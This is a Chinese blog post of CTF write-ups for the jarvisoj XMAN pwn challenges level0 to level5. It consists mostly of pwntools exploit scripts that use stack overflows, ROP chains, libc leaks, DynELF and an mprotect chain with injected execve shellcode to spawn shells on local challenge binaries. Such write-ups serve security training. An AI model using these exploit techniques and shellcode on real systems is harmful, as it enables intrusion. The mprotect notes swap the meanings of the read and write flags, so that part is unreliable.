---
layout:     post
title:      jarvisoj pwn部分writeup
author:     wooy0ung
tags: 		  pwn
category:  	writeup
---


>[索引目录]  
>0x001 [XMAN]level0  
>0x002 [XMAN]level1  
>0x003 [XMAN]level2
>0x004 [XMAN]level2 x64  
>0x005 [XMAN]level3
>0x006 [XMAN]level3 x64  
<!-- more -->
>0x007 [XMAN]level4  
>0x008 [XMAN]level5  

## 0x001 [XMAN]level0

栈溢出，只开了NX
```
from pwn import *

context.log_level = 'debug'

s = process("./level0.b9ded3801d6dd36a97468e128b81a65d")
elf = ELF("./level0.b9ded3801d6dd36a97468e128b81a65d")

callsystem_addr = 0x0000000000400596

p = "1" * (0x80 + 8)
p += p64(callsystem_addr)

sleep(0.2)
s.send(p)

s.interactive()
```


## 0x002 [XMAN]level1

保护全关
```
from pwn import *

context.log_level = 'debug'

s = process("./level1.80eacdcd51aca92af7749d96efad7fb5")
elf = ELF("./level1.80eacdcd51aca92af7749d96efad7fb5")

s.recvuntil("this:")
data = s.recvuntil("?")

stack_addr = int(data[:-1],16)

p = asm(shellcraft.i386.linux.sh())
p += "1" * (0x88 + 4 - len(p))
p += p32(stack_addr)

sleep(0.2)
s.send(p)

s.interactive()
```


## 0x003 [XMAN]level2

构造调用system("/bin/sh\x00")
```
from pwn import *

context.log_level = 'debug'

s = process("./level2.54931449c557d0551c4fc2a10f4778a1")
elf = ELF("./level2.54931449c557d0551c4fc2a10f4778a1")


system_addr = 0x08048320
binsh_addr = 0x0804A024

p = "1" * (0x88 + 4)
p += p32(system_addr)
p += "1" * 4
p += p32(binsh_addr)

sleep(0.2)
s.send(p)

s.interactive()
```


## 0x004 [XMAN]level2 x64

```
from pwn import *

context.log_level = 'debug'

s = process("./level2_x64.04d700633c6dc26afc6a1e7e9df8c94e")
elf = ELF("./level2_x64.04d700633c6dc26afc6a1e7e9df8c94e")

system_addr = 0x00000000004004C0
binsh_addr = 0x0000000000600A90
rdi_ret = 0x00000000004006b3

p = "1" * (0x80 + 8)
p += p64(rdi_ret)
p += p64(binsh_addr)
p += p64(system_addr)

sleep(0.2)
s.send(p)

s.interactive()
```

## 0x005 [XMAN]level3

write函数
```
ssize_t write(int fd, const void *buf, size_t nbyte)
fd：文件描述符，标准输入 0，标准输出 1，标准错误 2
buf：指定的缓冲区，即指针，指向一段内存单元
nbyte：要写入文件指定的字节数
返回值：写入文档的字节数（成功）；-1（出错）
```

泄露libc基址
```
from pwn import *

context.log_level = 'debug'

s = process("./level3")
# s = gdb.debug("./level3", "b *0x0804847E\nc\n")
elf = ELF("./level3")
libc = ELF("./libc.so.6")

read_got = elf.got["read"]
write_plt = elf.plt["write"]
vul_addr = elf.symbols["vulnerable_function"]

p = "1" * (0x88 + 4)
p += p32(write_plt)
p += p32(vul_addr)
p += p32(1)
p += p32(read_got)
p += p32(4)

s.recv()

sleep(0.2)
s.send(p)

data = s.recv(4)
read_addr = u32(data)

read_off = libc.symbols["read"]
libc.base = read_addr - read_off
system_addr = libc.symbols["system"] + libc.base
binsh_addr = libc.search("/bin/sh").next() + libc.base

p = "1" * (0x88 + 4)
p += p32(system_addr)
p += "1" * 4
p += p32(binsh_addr)

sleep(0.2)
s.send(p)

s.interactive()
```


## 0x006 [XMAN]level3 x64

x64寄存器传参
```
rdi rsi rdx rcx r8 r9
```

```
from pwn import *

context.log_level = 'debug'

s = process("./level3_x64")
elf = ELF("./level3_x64")
libc = ELF("./libc.so.6")

write_plt = elf.plt["write"]
read_got = elf.got["read"]
vul_addr = elf.symbols["vulnerable_function"]
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(1)
p += p64(rsi_r15)
p += p64(read_got)
p += "1" * 8
p += p64(write_plt)
p += p64(vul_addr)

s.recv()

sleep(0.2)
s.send(p)

data = s.recv(8)
read_addr = u64(data)


libc.base = read_addr - libc.symbols["read"]
system_addr = libc.symbols["system"] + libc.base
binsh_addr = libc.search("/bin/sh").next() + libc.base

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(binsh_addr)
p += p64(system_addr)

sleep(0.2)
s.send(p)

s.interactive()
```


## 0x007 [XMAN]level4

read函数
```
ssize_t read(int fd, void *buf, size_t count)
fd：文件描述符，标准输入 0，标准输出 1，标准错误 2
buf：指定的缓冲区，即指针，指向一段内存单元
count：要写入文件指定的字节数
返回值：成功返回读取的字节数，出错返回-1并设置errno
```

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}

ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```

DynELF泄露libc
```
from pwn import *

context.log_level = 'debug'

s = process("./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0")
elf = ELF("./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0")

write_plt = elf.plt["write"]
main_addr = elf.symbols["main"]

def leak(addr):
    p = "1" * (0x88 + 4)
    p += p32(write_plt)
    p += p32(main_addr)
    p += p32(1)
    p += p32(addr)
    p += p32(4)

    s.send(p)
    leaked = s.recv(4)
    print "[%s] -> [%s] = [%s]" % (hex(addr), hex(u32(leaked)), repr(leaked))
    return leaked

data = DynELF(leak, elf = ELF("level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0"))
system_addr = data.lookup("system", "libc")
print "[system()] -> [%s]" % (hex(system_addr))

bss_base = elf.bss()
read_plt = elf.plt["read"]

p = "1" * (0x88 + 4)
p += p32(read_plt)
p += p32(main_addr)
p += p32(0)
p += p32(bss_base)
p += p32(8)

sleep(0.2)
s.send(p)

sleep(0.2)
s.send("/bin/sh\x00")

p = "1" * (0x88 + 4)
p += p32(system_addr)
p += "1" * 4
p += p32(bss_base)

sleep(0.2)
s.send(p)

s.interactive()
```


0x008 [XMAN]level5

mprotect函数
```
int mprotect(const void *start, size_t len, int prot)
prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
PROT_READ：表示内存段内的内容可写
PROT_WRITE：表示内存段内的内容可读
PROT_EXEC：表示内存段中的内容可执行
PROT_NONE：表示内存段中的内容根本没法访问
如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量。
```

利用通用gadget
```
from pwn import *

context.log_level = 'debug'

s = process("./level5")
elf = ELF("./level5")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

log.info("#--------------------------------leak libc.base")
pause()
write_plt = elf.plt["write"]
read_got = elf.got["read"]
vul_addr = elf.symbols["vulnerable_function"]
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(1)
p += p64(rsi_r15)
p += p64(read_got)
p += "1" * 8
p += p64(write_plt)
p += p64(vul_addr)

s.recv()

sleep(0.2)
s.send(p)

data = s.recv(8)
read_addr = u64(data)

libc.base = read_addr - libc.symbols["read"]
mprotect_addr = libc.symbols["mprotect"] + libc.base
print "mprotect: ["+hex(mprotect_addr)+"]"


log.info("#--------------------------------write shellcode")
pause()
read_plt = elf.plt["read"]
bss_base = elf.bss()
rdi = 0x00000000004006b3
rsi_r15 = 0x00000000004006b1

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(0)
p += p64(rsi_r15)
p += p64(bss_base)
p += "1" * 8
p += p64(read_plt)
p += p64(vul_addr)

sleep(0.2)
s.send(p)

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
sleep(0.2)
s.send(sh)


log.info("#--------------------------------write shellcode addr")
pause()
bss_got = 0x0000000000600A48

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(0)
p += p64(rsi_r15)
p += p64(bss_got)
p += "1" * 8
p += p64(read_plt)
p += p64(vul_addr)

sleep(0.2)
s.send(p)

sleep(0.2)
s.send(p64(bss_base))


log.info("#--------------------------------write mprotect addr")
pause()
mprotect_got = 0x0000000000600A50

p = "1" * (0x80 + 8)
p += p64(rdi)
p += p64(0)
p += p64(rsi_r15)
p += p64(mprotect_got)
p += "1" * 8
p += p64(read_plt)
p += p64(vul_addr)

sleep(0.2)
s.send(p)

sleep(0.2)
s.send(p64(mprotect_addr))


log.info("#--------------------------------call mprotect & getshell")
pause()
gadget_one = 0x00000000004006A6
gadget_two = 0x0000000000400690

p = "1" * (0x80 + 8)
p += p64(gadget_one)
p += "1" * 8
p += p64(0)
p += p64(1)
p += p64(mprotect_got)
p += p64(7)
p += p64(0x1000)
p += p64(0x600000)
p += p64(gadget_two)
p += "1" * 8
p += p64(0)
p += p64(1)
p += p64(bss_got)
p += p64(0)
p += p64(0)
p += p64(0)
p += p64(gadget_two)

sleep(0.2)
s.send(p)

s.interactive()
```